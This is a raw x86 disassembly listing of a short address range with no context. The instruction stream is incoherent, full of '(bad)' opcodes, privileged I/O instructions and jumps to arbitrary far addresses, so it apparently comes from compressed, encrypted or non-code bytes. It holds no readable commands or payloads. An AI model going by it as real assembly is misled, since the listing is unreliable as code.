  41982b:	data16 ins BYTE PTR es:[edi],dx
  41982d:	(bad)  
  41982e:	push   ss
  41982f:	cmp    al,bh
  419831:	mov    bh,0x32
  419833:	leave  
  419834:	jl     0x419860
  419836:	je     0x4197ea
  419838:	js     0x4197fc
  41983a:	sbb    eax,0xa1bf3dbe
  41983f:	add    eax,0x43d0a32b
  419844:	dec    edi
  419845:	sbb    al,0xe4
  419847:	cli    
  419848:	(bad)  
  419849:	popf   
  41984a:	mov    dh,0xe9
  41984c:	in     al,0x4b
  41984e:	mul    esp
  419850:	daa    
  419851:	xchg   edi,eax
  419852:	int    0x39
  419854:	add    al,BYTE PTR [ebp+0x18]
  419857:	mov    BYTE PTR [edx+0x446efbb4],ch
  41985d:	sub    DWORD PTR [ecx-0x2d],edi
  419860:	add    bl,BYTE PTR [ecx]
  419862:	loop   0x4197e8
  419864:	in     eax,0xf4
  419866:	inc    ebp
  419867:	call   0x65842fad
  41986c:	outs   dx,DWORD PTR ds:[esi]
  41986d:	rcr    BYTE PTR [esi+ecx*8-0x6a],1
  419871:	je     0x4198ac
  419873:	lds    eax,FWORD PTR [ebp+ebp*1+0x6f]
  419877:	cmp    ecx,DWORD PTR [eax+0x72b5217c]
  41987d:	ds sahf 
  41987f:	fist   WORD PTR [esp+ebx*8]
  419882:	inc    ebp
  419883:	xchg   BYTE PTR [ecx-0x41],ch
  419886:	ds clc 
  419888:	pushf  
  419889:	mov    WORD PTR [ecx+edi*8+0x6290d650],es
  419890:	add    ebp,0x85833163
  419896:	jp     0x419910
  419898:	xor    DWORD PTR [edx+0x4963b174],eax
  41989e:	inc    edx
  41989f:	in     eax,dx
  4198a0:	clc    
  4198a1:	pop    esi
  4198a2:	mov    esi,0x38a0de6b
  4198a7:	aam    0xfc
  4198a9:	imul   ecx,esi,0x18
  4198ac:	stos   DWORD PTR es:[edi],eax
  4198ad:	and    ecx,DWORD PTR [ecx]
  4198af:	xor    ecx,0xffffffac
  4198b2:	push   ds
  4198b3:	stos   BYTE PTR es:[edi],al
  4198b4:	fmul   QWORD PTR [edx-0x23]
  4198b7:	loopne 0x419926
  4198b9:	and    DWORD PTR [ebp-0x410e9e5d],edi
  4198bf:	out    0x8,eax
  4198c1:	push   esp
  4198c2:	out    dx,eax
  4198c3:	sub    DWORD PTR [edx+0x55],ebp
  4198c6:	pop    eax
  4198c7:	xchg   BYTE PTR [bx+si+0x4f],al
  4198cb:	adc    DWORD PTR [ebp-0x63],eax
  4198ce:	mov    bh,0xf3
  4198d0:	mov    al,0x8d
  4198d2:	xor    BYTE PTR [edi*4-0x27315ba2],bh
  4198d9:	jp     0x41987a
  4198db:	mov    ecx,0x5f4f1b92
  4198e0:	lods   eax,DWORD PTR ds:[esi]
  4198e1:	lods   al,BYTE PTR ds:[esi]
  4198e2:	pusha  
  4198e3:	stos   BYTE PTR es:[edi],al
  4198e4:	xor    al,0xb0
  4198e6:	div    edi
  4198e8:	mov    ah,0x76
  4198ea:	ret    
  4198eb:	sbb    eax,0x6d05637a
  4198f0:	xchg   DWORD PTR [ecx+0x4611c347],ebx
  4198f6:	test   BYTE PTR [ebp+ebp*1-0x5a],ch
  4198fa:	jle    0x4198d6
  4198fc:	or     dh,BYTE PTR [edi+0x7edcf647]
  419902:	les    ebx,FWORD PTR [eax+0x663755c]
  419908:	and    al,0x94
  41990a:	hlt    
  41990b:	push   cs
  41990c:	xchg   ebp,eax
  41990d:	jl     0x419955
  41990f:	and    BYTE PTR [ecx-0x203fa9c8],dl
  419915:	addr16 shr cl,cl
  419918:	loop   0x419919
  41991a:	pop    esp
  41991b:	sub    dl,dl
  41991d:	add    eax,0xb214b79b
  419922:	adc    DWORD PTR cs:[ebx],0x27a25a5b
  419929:	in     eax,dx
  41992a:	xor    al,0xc1
  41992c:	sar    BYTE PTR [eax+0x8af7a96],cl
  419932:	test   al,bh
  419934:	daa    
  419935:	ins    DWORD PTR es:[edi],dx
  419936:	pop    ecx
  419937:	fisubr WORD PTR [eax]
  419939:	pop    ss
  41993a:	and    ebx,DWORD PTR [edi+0x4]
  41993d:	pop    ebx
  41993e:	in     eax,dx
  41993f:	aas    
  419940:	pop    eax
  419941:	add    DWORD PTR [eax+eiz*8],esi
  419944:	xor    eax,0x9194a7f8
  419949:	mov    bl,0xe5
  41994b:	leave  
  41994c:	ja     0x41991e
  41994e:	and    al,0xb6
  419950:	inc    esi
  419951:	arpl   WORD PTR [edx+0x49d5305d],ax
  419957:	dec    esp
  419958:	dec    edi
  419959:	ja     0x41992a
  41995b:	mov    al,0xbf
  41995d:	mov    al,BYTE PTR [esi-0x67]
  419960:	out    0xc1,eax
  419962:	push   edi
  419963:	xchg   ebx,eax
  419964:	mov    edx,0x124d931
  419969:	fisubr DWORD PTR [ebp-0x7d]
  41996c:	xlat   BYTE PTR ds:[ebx]
  41996d:	add    al,0x22
  41996f:	pop    eax
  419970:	sbb    edi,edi
  419972:	gs iret 
  419974:	ja     0x4199ca
  419976:	es fwait
  419978:	xor    DWORD PTR [edx-0x70],esp
  41997b:	mov    eax,0x7a0f171b
  419980:	mov    esp,0xad3d731b
  419985:	dec    ebx
  419986:	sbb    eax,0x53286e20
  41998b:	or     DWORD PTR [edx],ebp
  41998d:	push   0xffffffa5
  41998f:	int3   
  419990:	sbb    cl,BYTE PTR [edx+0x3c]
  419993:	arpl   WORD PTR [ecx-0x208ee803],bx
  419999:	and    bl,BYTE PTR [ebp-0x5f]
  41999c:	daa    
  41999d:	pop    ss
  41999e:	fsub   DWORD PTR [ecx+0x5f5ef557]
  4199a4:	push   ecx
  4199a5:	inc    BYTE PTR [edx-0x23]
  4199a8:	aad    0xe3
  4199aa:	pop    ebp
  4199ab:	add    DWORD PTR [ebx],ecx
  4199ad:	mov    ah,BYTE PTR [eax+0x51]
  4199b0:	mov    ds:0xc0d3e58f,al
  4199b5:	add    al,0xc0
  4199b7:	mov    esp,es
  4199b9:	xor    BYTE PTR [ebx],cl
  4199bb:	pop    es
  4199bc:	daa    
  4199bd:	enter  0xa1fe,0x5d
  4199c1:	inc    edi
  4199c2:	ds jo  0x4199fc
  4199c5:	ja     0x4199db
  4199c7:	or     BYTE PTR [ecx],bh
  4199c9:	outs   dx,DWORD PTR ds:[esi]
  4199ca:	dec    edi
  4199cb:	sub    eax,0x5469d977
  4199d0:	pop    ebp
  4199d1:	jl     0x419a1f
  4199d3:	sbb    BYTE PTR [eax+0x3f],al
  4199d6:	jle    0x419a15
  4199d8:	sub    eax,0x2e3bfab2
  4199dd:	fdiv   QWORD PTR [ecx+0x6137b092]
  4199e3:	pop    ebx
  4199e4:	retf   0x7bf
  4199e7:	dec    ecx
  4199e8:	in     al,0xae
  4199ea:	repz (bad) 
  4199ec:	and    dl,BYTE PTR [ecx+0x5753fe27]
  4199f2:	retf   0xcb5d
  4199f5:	outs   dx,DWORD PTR ds:[esi]
  4199f6:	and    DWORD PTR [edx],esp
  4199f8:	jg     0x4199a9
  4199fa:	je     0x4199ab
  4199fc:	dec    esi
  4199fd:	loop   0x4199af
  4199ff:	test   al,0x1d
  419a01:	dec    edx
  419a02:	and    BYTE PTR [ecx-0x4bee1213],al
  419a08:	jbe    0x4199e0
  419a0a:	jbe    0x419a52
  419a0c:	sbb    eax,0xae6db37e
  419a11:	(bad)  
  419a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a13:	into   
  419a14:	repnz sbb BYTE PTR [ecx-0x161ea1ce],bl
  419a1b:	xor    ecx,DWORD PTR es:[edx+0x189a4dbf]
  419a22:	cmc    
  419a23:	iret   
  419a24:	sbb    al,0x13
  419a26:	jge    0x419a4b
  419a28:	xor    DWORD PTR [ebx],eax
  419a2a:	dec    ebp
  419a2b:	adc    DWORD PTR [ebx+ecx*1],edx
  419a2e:	fstp   TBYTE PTR [edi-0x36]
  419a31:	xor    esp,DWORD PTR [edi]
  419a33:	repnz pop edi
  419a35:	clc    
  419a36:	adc    al,0xe0
  419a38:	push   0xffffffa0
  419a3a:	retf   
  419a3b:	jae    0x4199e0
  419a3d:	adc    al,0xf5
  419a3f:	adc    esp,DWORD PTR [esi]
  419a41:	sbb    dl,BYTE PTR [ebx]
  419a43:	fistp  QWORD PTR [esi-0x35]
  419a46:	sub    ch,dl
  419a48:	ja     0x4199dc
  419a4a:	std    
  419a4b:	fstp   DWORD PTR [eax+0x67]
  419a4e:	data16 jne 0x4199e1
  419a51:	xchg   edi,eax
  419a52:	inc    ecx
  419a53:	(bad)  
  419a54:	scas   al,BYTE PTR es:[edi]
  419a55:	xor    eax,0x3741b393
  419a5a:	clc    
  419a5b:	hlt    
  419a5c:	dec    ebp
  419a5d:	daa    
  419a5e:	popf   
  419a5f:	out    dx,al
  419a60:	into   
  419a61:	stc    
  419a62:	mov    ebx,0x46c32734
  419a67:	cmp    al,0xda
  419a69:	ins    BYTE PTR es:[edi],dx
  419a6a:	jmp    0xcfe0:0x5e5ddf0e
  419a71:	or     bh,BYTE PTR [esi]
  419a73:	lea    esi,[esi]
  419a75:	jle    0x419a88
  419a77:	ss and eax,0x872a02b1
  419a7d:	push   es
  419a7e:	ret    
  419a7f:	xchg   ecx,eax
  419a80:	cmp    al,0x5e
  419a82:	(bad)  
  419a83:	sbb    eax,0x8d925a1d
  419a88:	xchg   edx,eax
  419a89:	jmp    0x6ec8c9d2
  419a8e:	fwait
  419a8f:	xchg   ebp,eax
  419a90:	mov    ds:0xff4d827b,al
  419a95:	mov    eax,DWORD PTR [ecx-0x52f14857]
  419a9b:	add    bh,BYTE PTR [edi]
  419a9d:	mov    ebx,0x86017b67
  419aa2:	nop
  419aa3:	or     esi,DWORD PTR [eax]
  419aa5:	cmc    
  419aa6:	pop    ecx
  419aa7:	push   0x68d76ab5
  419aac:	or     ah,cl
  419aae:	push   es
  419aaf:	jle    0x419ae5
  419ab1:	dec    esp
  419ab2:	mov    dl,0xe7
  419ab4:	ins    DWORD PTR es:[edi],dx
  419ab5:	lods   al,BYTE PTR ds:[esi]
  419ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ab7:	daa    
  419ab8:	mov    ds:0x68d15ab,al
  419abd:	mov    esi,0xcad2170
  419ac2:	xor    eax,0x414a65b3
  419ac7:	(bad)  
  419ac8:	sti    
  419ac9:	pop    ss
  419aca:	and    DWORD PTR [eax+0x2f],ebp
  419acd:	inc    esi
  419ace:	stc    
  419acf:	inc    esi
  419ad0:	mov    DWORD PTR [edx],ecx
  419ad2:	(bad)  
  419ad4:	fld    TBYTE PTR [esi-0x111805ca]
  419ada:	sti    
  419adb:	sbb    BYTE PTR [edi+edx*2],0xe0
  419adf:	aam    0x75
  419ae1:	repnz mov ecx,0x1d9c4eee
  419ae7:	mov    al,0xfa
  419ae9:	push   edx
  419aea:	xlat   BYTE PTR ds:[ebx]
  419aeb:	std    
  419aec:	punpckldq mm3,DWORD PTR [ebp+esi*2-0x56]
  419af1:	dec    esi
  419af2:	stc    
  419af3:	repnz in al,dx
  419af5:	popa   
  419af6:	loope  0x419b50
  419af8:	in     al,0x2c
  419afa:	mov    ds:0x408aa847,eax
  419aff:	sar    edi,1
  419b01:	pop    edi
  419b02:	je     0x419b4c
  419b04:	(bad)  
  419b05:	inc    edx
  419b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b07:	cdq    
  419b08:	data16 mov ch,0x21
  419b0b:	icebp  
  419b0c:	push   0x6b76cb26
  419b11:	adc    ebp,edx
  419b13:	in     eax,dx
  419b14:	fnstsw WORD PTR [ebx+ebp*2-0x3d]
  419b18:	sub    BYTE PTR [edx],bh
  419b1a:	shl    DWORD PTR [ebx-0x25a40bae],cl
  419b20:	xor    ebp,DWORD PTR [eax-0x3a]
  419b23:	test   al,0xc8
  419b25:	test   al,0x2
  419b27:	std    
  419b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b29:	(bad)  
  419b2a:	(bad)  
  419b2b:	cwde   
  419b2c:	iret   
  419b2d:	pop    edi
  419b2e:	mov    bh,0xf2
  419b30:	out    0x4a,eax
  419b32:	or     esp,DWORD PTR [edi+0x24]
  419b35:	loope  0x419b27
  419b37:	call   0x8860:0xfa10fcfa
  419b3e:	push   esp
  419b3f:	retf   
  419b40:	fwait
  419b41:	sahf   
  419b42:	push   esp
  419b43:	mov    bl,0xeb
  419b45:	adc    BYTE PTR [edx],0x3b
  419b48:	push   esp
  419b49:	in     al,dx
  419b4a:	sub    ch,BYTE PTR [edi+0x58]
  419b4d:	xor    al,BYTE PTR [eax+eax*8+0x42b752ec]
  419b54:	pop    edx
  419b55:	mov    dl,0x1d
  419b57:	sub    al,0x2c
  419b59:	sbb    bh,al
  419b5b:	inc    esp
  419b5c:	outs   dx,DWORD PTR ds:[esi]
  419b5d:	cmp    cl,al
  419b5f:	(bad)  
  419b61:	fcomp  QWORD PTR [di-0x13]
  419b65:	inc    edx
  419b66:	fld    TBYTE PTR [ecx+ebx*2+0x37]
  419b6a:	lahf   
  419b6b:	mov    WORD PTR [ebx+0x60899576],?
  419b71:	das    
  419b72:	retf   0x6e09
  419b75:	mov    ah,0xee
  419b77:	xor    BYTE PTR [edx+ebx*2-0x4afbd49a],0xa9
  419b7f:	or     eax,DWORD PTR [edi-0x41325010]
  419b85:	outs   dx,BYTE PTR ds:[esi]
  419b86:	retf   
  419b87:	sub    eax,0x41919f7b
  419b8c:	and    edx,DWORD PTR [edx]
  419b8e:	inc    ebp
  419b8f:	or     eax,0x4eb4d09d
  419b94:	mov    cl,0x7f
  419b96:	mov    dl,0x8f
  419b98:	jns    0x419b6f
  419b9a:	push   0xffffffd0
  419b9c:	cld    
  419b9d:	pop    eax
  419b9e:	xchg   esi,eax
  419b9f:	(bad)  
  419ba1:	push   cs
  419ba2:	dec    esi
  419ba3:	aam    0x39
  419ba5:	adc    DWORD PTR [esi-0x2],ecx
  419ba8:	aad    0x9
  419baa:	loope  0x419bd0
  419bac:	shl    BYTE PTR [eax+0x1a],cl
  419baf:	stos   BYTE PTR es:[edi],al
  419bb0:	cld    
  419bb1:	jp     0x419bee
  419bb3:	es scas eax,DWORD PTR es:[edi]
  419bb5:	mov    edx,0x921d72db
  419bba:	dec    ebp
  419bbb:	and    DWORD PTR [eax-0x2f],eax
  419bbe:	loope  0x419b4d
  419bc0:	stc    
  419bc1:	lahf   
  419bc2:	fsub   st,st(0)
  419bc4:	push   eax
  419bc5:	int    0x27
  419bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc8:	cmp    bl,bh
  419bca:	mov    eax,0x3170d589
  419bcf:	push   edx
  419bd0:	push   es
  419bd1:	fnstsw WORD PTR [eax+0x60]
  419bd4:	pop    ds
  419bd5:	jle    0x419c53
  419bd7:	loopne 0x419b71
  419bd9:	lods   al,BYTE PTR ds:[esi]
  419bda:	push   edi
  419bdb:	lea    esi,[edi-0x65]
  419bde:	mov    dh,BYTE PTR [eax+0x7e1ff0e9]
  419be4:	cli    
  419be5:	jmp    0xa058:0x2e48e853
  419bec:	inc    esi
  419bed:	push   edi
  419bee:	xchg   BYTE PTR [edx-0x63],ah
  419bf1:	inc    esp
  419bf2:	out    0x59,eax
  419bf4:	and    edi,DWORD PTR [edx+0xf]
  419bf7:	pop    edx
  419bf8:	imul   ebp,edi,0x99f6a80
  419bfe:	sub    eax,0x71d5371
  419c03:	aam    0x9f
  419c05:	and    ecx,ebp
  419c07:	cmp    eax,0xae12169c
  419c0c:	mov    edi,DWORD PTR [ecx+0x493df22a]
  419c12:	add    eax,0x237b948d
  419c17:	enter  0x3543,0x13
  419c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c1c:	push   ebp
  419c1d:	push   esp
  419c1e:	lock sub al,cl
  419c21:	scas   al,BYTE PTR es:[edi]
  419c22:	mov    cl,0x92
  419c24:	rcr    BYTE PTR [ecx*4+0x338db93f],1
  419c2b:	or     eax,0x3865fdfb
  419c30:	or     ecx,DWORD PTR [ecx+0x54]
  419c33:	ins    BYTE PTR es:[edi],dx
  419c34:	hlt    
  419c35:	sahf   
  419c36:	je     0x419be9
  419c38:	lods   al,BYTE PTR ds:[esi]
  419c3a:	out    dx,al
  419c3b:	sub    BYTE PTR [ebx-0x278e03a6],dh
  419c41:	pop    ds
  419c42:	dec    ebp
  419c43:	fwait
  419c44:	stc    
  419c45:	dec    ebp
  419c46:	cmp    eax,0xc600b19c
  419c4b:	stc    
  419c4c:	sub    edx,DWORD PTR [esi]
  419c4e:	cwde   
  419c4f:	int    0xd8
  419c51:	fst    DWORD PTR [edi+edi*8-0x1b]
  419c55:	call   0x866e6a3b
  419c5a:	pop    ds
  419c5b:	icebp  
  419c5c:	mov    eax,0xa664df45
  419c61:	xchg   edx,eax
  419c62:	stos   DWORD PTR es:[edi],eax
  419c63:	mov    al,0xe8
  419c65:	cmovo  eax,DWORD PTR [eax-0x32e6f1f5]
  419c6c:	push   cs
  419c6d:	push   ebp
  419c6e:	inc    edi
  419c6f:	pushf  
  419c70:	stc    
  419c71:	sub    ebx,DWORD PTR [eax-0x4a0f8373]
  419c77:	rol    BYTE PTR [edi-0x463005d2],cl
  419c7d:	fisub  WORD PTR [edx]
  419c7f:	test   BYTE PTR gs:[eax],ch
  419c82:	retf   
  419c83:	aas    
  419c84:	bound  ebp,QWORD PTR [ebx]
  419c86:	test   BYTE PTR [ebx],al
  419c88:	xor    edi,DWORD PTR [eax+edx*1]
  419c8b:	xchg   ebx,eax
  419c8c:	fwait
  419c8d:	mov    bh,BYTE PTR [ebx]
  419c8f:	or     edx,ecx
  419c91:	in     al,dx
  419c92:	fstp   DWORD PTR [edi+eiz*4+0x7d9e28d2]
  419c99:	lahf   
  419c9a:	sar    BYTE PTR [eax-0x7c324008],1
  419ca0:	xor    al,0xda
  419ca2:	mov    WORD PTR [ecx-0x45],fs
  419ca5:	ss jmp 0xd4fe7ed9
  419cab:	daa    
  419cac:	mov    esp,DWORD PTR [ebx+0x1]
  419caf:	jp     0x419d0e
  419cb1:	mov    WORD PTR [esi-0x7cdd3798],fs
  419cb7:	sub    al,0xe1
  419cb9:	pushf  
  419cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbb:	xor    eax,0xa9a32c16
  419cc0:	mov    bh,0xba
  419cc3:	imul   esi,ecx,0xd
  419cc6:	dec    ebx
  419cc7:	cmp    eax,0x9c17134
  419ccc:	xor    esi,DWORD PTR [eax]
  419cce:	outs   dx,DWORD PTR ds:[esi]
  419ccf:	cmp    eax,0x3eab1ae1
  419cd4:	test   al,0xcf
  419cd6:	pop    ebx
  419cd7:	dec    edi
  419cd8:	push   eax
  419cd9:	mov    ch,0xa3
  419cdb:	pop    edi
  419cdc:	and    bl,cl
  419cde:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce0:	cmc    
  419ce1:	adc    al,0xac
  419ce3:	(bad)  
  419ce4:	aaa    
  419ce5:	popf   
  419ce6:	fimul  WORD PTR [ebx+0x12]
  419ce9:	stos   BYTE PTR es:[edi],al
  419cea:	jl     0x419d52
  419cec:	(bad)  
  419cee:	sbb    ah,bh
  419cf0:	mov    ds:0x5eef1c96,al
  419cf5:	xchg   esi,eax
  419cf6:	adc    ebp,esi
  419cf8:	mov    ebp,0xcca8ab70
  419cfd:	pop    ecx
  419cfe:	xchg   esi,eax
  419cff:	push   esi
  419d00:	ret    0xa271
  419d03:	sbb    ebx,DWORD PTR [edx+0x2c]
  419d06:	mov    dl,0xb7
  419d08:	mov    ah,0x89
  419d0a:	xor    DWORD PTR [ebx+0x10212107],0x45c3a455
  419d14:	test   BYTE PTR [ebx+0x2a],bl
  419d17:	lods   al,BYTE PTR ds:[esi]
  419d18:	retf   0x4003
  419d1b:	sbb    eax,0x132566a7
  419d20:	cld    
  419d21:	pop    edx
  419d22:	sbb    al,0x32
  419d24:	out    0x81,al
  419d26:	ret    0x48aa
  419d29:	pushf  
  419d2a:	inc    edx
  419d2b:	outs   dx,DWORD PTR ds:[esi]
  419d2c:	add    DWORD PTR [eax-0x6546205f],eax
  419d32:	inc    esi
  419d33:	mov    dh,0x35
  419d35:	jnp    0x419d91
  419d37:	dec    ebx
  419d38:	ins    DWORD PTR es:[edi],dx
  419d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d3a:	xlat   BYTE PTR ds:[ebx]
  419d3b:	lods   eax,DWORD PTR ds:[esi]
  419d3c:	xor    DWORD PTR [eax-0x7ad0b51a],ecx
  419d42:	iret   
  419d43:	enter  0xe5f8,0xbb
  419d47:	xchg   ecx,eax
  419d48:	iret   
  419d49:	inc    ebx
  419d4a:	push   ss
  419d4b:	rol    DWORD PTR [ecx+0x1b8d06d2],cl
  419d51:	mov    WORD PTR [edx],es
  419d53:	hlt    
  419d54:	pmuludq mm4,QWORD PTR [ebx+eax*1+0xc6b99a]
  419d5c:	das    
  419d5d:	or     BYTE PTR [edi+0x29de0dec],bh
  419d63:	add    eax,0xa4d888a4
  419d68:	xchg   esi,eax
  419d69:	jnp    0x419d5e
  419d6b:	sar    DWORD PTR [ebp+ebx*2-0x54],cl
  419d6f:	push   0xffffffb7
  419d71:	fnstsw WORD PTR [eax]
  419d73:	out    dx,eax
  419d74:	mov    eax,0x7efb9eec
  419d79:	les    edx,FWORD PTR [ebx+0x13e05c47]
  419d7f:	addr16 jg 0x419d0b
  419d82:	mov    eax,0xaeff43fc
  419d87:	arpl   WORD PTR [esi+0x6a43bda7],si
  419d8d:	mov    al,0x11
  419d8f:	or     al,0x9e
  419d91:	in     al,dx
  419d92:	repnz push ebx
  419d94:	jno    0x419db0
  419d96:	das    
  419d97:	ror    BYTE PTR [edi],cl
  419d99:	mov    esi,0x98dbdb1d
  419d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d9f:	jns    0x419df8
  419da1:	(bad)  
  419da2:	sub    ch,dl
  419da4:	ins    DWORD PTR es:[edi],dx
  419da5:	(bad)  
  419da6:	mov    ebp,0x18426f01
  419dab:	and    al,0x52
  419dad:	push   es
  419dae:	clc    
  419daf:	sub    eax,0x688d5b99
  419db4:	sahf   
  419db5:	clc    
  419db6:	ret    0x61fc
  419db9:	inc    ebp
  419dba:	inc    ebx
  419dbb:	add    eax,0x6921e14f
  419dc0:	fisttp DWORD PTR [ecx-0x2d]
  419dc3:	cs xchg esp,eax
  419dc5:	sbb    BYTE PTR [edi],ch
  419dc7:	shl    DWORD PTR [ebp-0x57],0xa
  419dcb:	jno    0x419e35
  419dcd:	je     0x419dfd
  419dcf:	stos   BYTE PTR es:[edi],al
  419dd0:	pop    eax
  419dd1:	dec    esi
  419dd2:	jl     0x419d71
  419dd4:	out    dx,al
  419dd5:	loop   0x419dd3
  419dd7:	or     BYTE PTR [esi+0x26],bl
  419dda:	out    0x72,al
  419ddc:	sar    BYTE PTR [eax+ecx*4+0xbc0755c],0x2d
  419de4:	cmp    cl,dl
  419de6:	mov    ebx,0x28fd12a6
  419deb:	dec    esp
  419dec:	sub    eax,0x2a202c6
  419df1:	rcr    BYTE PTR [edi+ebp*8-0x7a326198],1
  419df8:	fisubr WORD PTR [eax+0x15]
  419dfb:	fs xor al,0x38
  419dfe:	inc    esp
  419dff:	call   0x846b:0x87569db
  419e06:	test   BYTE PTR [ebx+0x3d],bh
  419e09:	icebp  
  419e0a:	sbb    DWORD PTR [edi-0x6d9805f9],0x55f1037c
  419e14:	test   BYTE PTR [ebx+0x7c],dl
  419e17:	scas   eax,DWORD PTR es:[edi]
  419e18:	int3   
  419e19:	jns    0x419dee
  419e1b:	push   ebp
  419e1c:	xchg   ecx,eax
  419e1d:	push   0x67
  419e1f:	sbb    al,0xfc
  419e21:	mov    esi,0x1ee292aa
  419e26:	(bad)  [edi+0x7]
  419e2a:	pop    es
  419e2b:	daa    
  419e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e2d:	sub    al,0x13
  419e2f:	jle    0x419e94
  419e31:	sbb    eax,0xfc440dc3
  419e36:	sbb    DWORD PTR [esi],ebx
  419e38:	xchg   BYTE PTR [ebp-0x5d],al
  419e3b:	pusha  
  419e3c:	push   ecx
  419e3d:	je     0x419de4
  419e3f:	mov    WORD PTR [ebx],gs
  419e41:	mov    edx,0x40624459
  419e46:	loope  0x419e25
  419e48:	push   ebp
  419e49:	shl    ebx,1
  419e4b:	daa    
  419e4c:	jnp    0x419e9e
  419e4e:	jg     0x419dec
  419e50:	aam    0x6e
  419e52:	cld    
  419e53:	xor    DWORD PTR fs:[esi],0x41
  419e57:	int    0x1e
  419e59:	popa   
  419e5a:	add    al,0x71
  419e5c:	cmp    esp,DWORD PTR [edi+ebx*1]
  419e5f:	jns    0x419e32
  419e61:	out    0xbe,al
  419e63:	test   al,0x6f
  419e65:	call   0xcab8dc60
  419e6a:	xor    ah,BYTE PTR [ebx+0x5cd9d5bd]
  419e70:	pop    edx
  419e71:	dec    ebx
  419e72:	mov    ds:0x446f1c9b,eax
  419e77:	push   eax
  419e78:	in     eax,0x60
  419e7a:	lods   eax,DWORD PTR ds:[esi]
  419e7b:	dec    ebx
  419e7c:	fcmovbe st,st(4)
  419e7e:	pusha  
  419e7f:	inc    ebx
  419e80:	shl    BYTE PTR [edx],cl
  419e82:	xchg   esp,eax
  419e83:	mov    ch,0x29
  419e85:	xchg   ecx,eax
  419e86:	and    DWORD PTR [esi-0x78],eax
  419e89:	aam    0xee
  419e8b:	cmp    edx,DWORD PTR [edx-0x53fcca55]
  419e91:	mov    ebp,0xf2c0e6ac
  419e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e97:	stc    
  419e98:	ror    BYTE PTR [ebp-0x30c49ddb],1
  419e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e9f:	(bad)  
  419ea0:	aad    0x5c
  419ea2:	es mov edx,0x211cd92b
  419ea8:	mov    WORD PTR [ecx-0x73],ss
  419eab:	pop    edi
  419eac:	adc    edx,ebp
  419eae:	ss mov esp,?
  419eb1:	push   ebx
  419eb2:	or     BYTE PTR [edx],0x7b
  419eb5:	loopne 0x419ea8
  419eb7:	std    
  419eb8:	sbb    al,0x32
  419eba:	fcmovbe st,st(5)
  419ebc:	dec    esp
  419ebd:	sbb    cl,dl
  419ebf:	icebp  
  419ec0:	ss stc 
  419ec2:	lods   al,BYTE PTR ds:[esi]
  419ec3:	mov    bl,0x40
  419ec5:	inc    ebp
  419ec6:	retf   
  419ec7:	adc    BYTE PTR [ecx],cl
  419ec9:	mov    ch,0x9b
  419ecb:	xchg   ecx,eax
  419ecc:	jne    0x419e6c
  419ece:	pushf  
  419ecf:	stos   DWORD PTR es:[edi],eax
  419ed0:	daa    
  419ed1:	adc    eax,0xc777f47d
  419ed6:	jl     0x419ef2
  419ed8:	or     dh,dh
  419eda:	popf   
  419edb:	push   edi
  419edc:	frstor [esi+0x13381ba0]
  419ee2:	mov    ebp,0xf4927eb
  419ee7:	mov    ds,WORD PTR [esi]
  419ee9:	in     eax,dx
  419eea:	cmp    eax,0xeb059031
  419eef:	repnz in al,dx
  419ef1:	icebp  
  419ef2:	or     ebx,DWORD PTR [edx+0x5fc7c753]
  419ef8:	rcl    DWORD PTR [esi+0x2a],0x52
  419efc:	cmp    al,0xb
  419efe:	add    eax,0x97350989
  419f03:	fld    st(5)
  419f05:	add    ebp,DWORD PTR [edi+0x62f90102]
  419f0b:	xchg   ecx,eax
  419f0c:	dec    edx
  419f0d:	adc    BYTE PTR [edx-0x39162ace],cl
  419f13:	repz fcomp DWORD PTR gs:[ebx-0x60097245]
  419f1b:	or     edi,DWORD PTR [edi-0x43]
  419f1e:	stos   BYTE PTR es:[edi],al
  419f1f:	add    al,0x3e
  419f21:	mov    ebp,0x4bfc268f
  419f26:	dec    bx
  419f28:	fisttp DWORD PTR [ebx]
  419f2a:	ret    0xc59
  419f2d:	fmul   QWORD PTR [ebp-0x7d9744c9]
  419f33:	es jne 0x419f6f
  419f36:	lods   eax,DWORD PTR ds:[esi]
  419f37:	xor    DWORD PTR [edi-0x792a36db],edi
  419f3d:	sub    BYTE PTR [edx],bh
  419f3f:	lods   al,BYTE PTR ds:[esi]
  419f40:	in     al,0x8d
  419f42:	xor    eax,DWORD PTR [eax]
  419f44:	pop    eax
  419f45:	pop    esp
  419f46:	sbb    BYTE PTR [edi],ah
  419f48:	(bad)  
  419f49:	pop    eax
  419f4a:	mov    edi,0xf16c0a0a
  419f4f:	aad    0xef
  419f51:	xor    BYTE PTR [edi-0x6ef1c12b],al
  419f57:	or     dl,bl
  419f59:	sbb    edi,DWORD PTR [edx-0x5ca99706]
  419f5f:	mov    eax,ds:0x462c772f
  419f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f65:	inc    esi
  419f66:	push   esp
  419f67:	call   0x9ecd1330
  419f6c:	jmp    0x12f7e696
  419f71:	aaa    
  419f72:	inc    eax
  419f73:	xor    edi,edx
  419f75:	fs jbe 0x419f54
  419f78:	mov    esi,ecx
  419f7a:	dec    ebx
  419f7b:	fidiv  WORD PTR [ecx]
  419f7d:	mov    bl,0xa5
  419f7f:	adc    al,0xe7
  419f81:	sbb    al,0xa6
  419f83:	mov    al,ds:0xaaca99a
  419f88:	jp     0x419f3c
  419f8a:	(bad)  
  419f8b:	fsub   QWORD PTR [edi]
  419f8d:	push   edx
  419f8e:	call   0x249f:0x41ce05a2
  419f95:	loop   0x419f28
  419f97:	mov    WORD PTR [edi-0x378c4167],ds
  419f9d:	in     al,dx
  419f9e:	mov    cl,0x9
  419fa0:	rcl    DWORD PTR [eax],0xe
  419fa3:	repz and esi,esi
  419fa6:	cmc    
  419fa7:	push   cs
  419fa8:	xor    al,0x62
  419faa:	mov    edx,0x6bcff057
